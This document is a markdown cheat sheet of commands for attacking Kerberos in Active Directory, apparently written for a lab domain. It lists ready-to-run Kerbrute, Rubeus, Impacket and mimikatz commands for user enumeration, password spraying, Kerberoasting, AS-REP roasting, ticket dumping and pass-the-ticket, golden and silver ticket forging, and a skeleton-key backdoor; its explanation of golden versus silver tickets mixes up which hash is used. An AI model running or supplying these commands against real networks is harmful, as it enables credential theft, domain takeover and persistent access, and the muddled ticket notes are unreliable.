# Attacking Kerberos 

## Enumeration w/ Kerbrute
```shell
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

## Harvesting Tickets w/ Rubeus
This command tells Rubeus to harvest for TGTs every 30 seconds
```shell
Rubeus.exe harvest /interval:30
```
## Password-Spraying w/ Rubeus
```shell
Rubeus.exe brute /password:Password1 /noticket
```
## Kerberoasting w/ Rubeus & Impacket (Local Admin Required)
It helps to crack the hash and use it with Mimikatz to create tickets.
```shell
Rubeus.exe kerberoast
```
```shell
impacket-GetUserSPNs  -dc-ip MACHINE_IP domain.local/Machine1:Password1           # Check SPNs accosiated with this machine/user.
impacket-GetUserSPNs  -dc-ip MACHINE_IP domain.local/Machine1:Password1 -request # Does a kerberoast attack
```
## AS-REP Roasting w/ Rubeus & Impacket
```shell
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>```
```
```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```
## Pass the Ticket w/ mimikatz
```shell
mimikatz.exe
privilege::debug           #Ensure this outputs [output '20' OK] (You need admin privileges)
sekurlsa::tickets /export  #This will export all of the .kirbi tickets into the directory that you are currently in.
kerberos::ptt <ticket>     #This will cache and impersonate the given ticket.
klist                      #Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
```
## Golden/Silver Ticket Attacks w/ mimikatz
Dump the krbtgt hash
```shell
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:SQLService
```
You need to change `/name:` value to the domain account/service you want.

### Create a Silver Ticket
```shell
Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:1103
```
### Create a Golden Ticket
```shell
Kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM hash> /id:500
```
`misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.

`sid:` -> The sid of the service account.

`krbtgt` -> Put a service NTLM hash here.

`id` -> Put 500 to create golden tickets, change it to 1103 for silver tickets.

## Kerberos Backdoors w/ mimikatz (Skeleton Key)
```shell
mimikatz.exe
privilege::debug
misc::skeleton
```
